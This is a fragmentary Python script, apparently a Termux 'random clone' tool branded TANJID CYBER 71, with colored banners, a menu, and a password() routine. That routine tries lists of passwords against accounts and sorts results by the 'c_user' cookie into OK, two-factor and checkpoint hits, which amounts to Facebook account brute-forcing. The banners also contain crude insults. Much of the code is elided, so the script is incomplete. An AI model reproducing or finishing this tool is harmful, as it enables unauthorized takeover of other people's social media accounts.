...
ha = current.day
today = date.today()
TANJID2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
{BLUE}=  ====  ==      ====  =======
==============================
\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33mTANJID CYBER 71\033[1;37m══════════════ⒽⒷⒻ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mBangladesh cyber 71     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mTANJID_VAI\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mSawya nai             \033[1;31m │
...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mBANGLADESH CYBER 71              \033[1;31m   │
\033[1;37m╚ⒽⒷⒻCommand Ar Mare Cudi{ HBF }\033[1;37mⒽⒷⒻ╝
\033[1;91m==========================================================
...
def my_tool_security():
    ...
    print("\t  Fb page  : Bangladesh cyber 71")
    print("\t  Github   : Tor mare Cudi")
    print(c, 45*"-")
    print(47*"-")
    try:
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_TANJID_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if TANJID in ["1","01"]:
        ...
        os.system("xdg-open https://wa.me/+8801996225443")
        xyz()    
    elif TANJID in ["0","00"]:
       exit()
    else:
...
def password():
    ...
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{TANJID2} : ")
    if passX in ['1','01']:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[TANJID-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[1;34m[TANJID-2F] '+uid+' [~] '+ps+' ')
                    ...
                    print(f'\r\033[1;30m[TANJID-CP] '+uid+' [×] '+ps+ ' ')
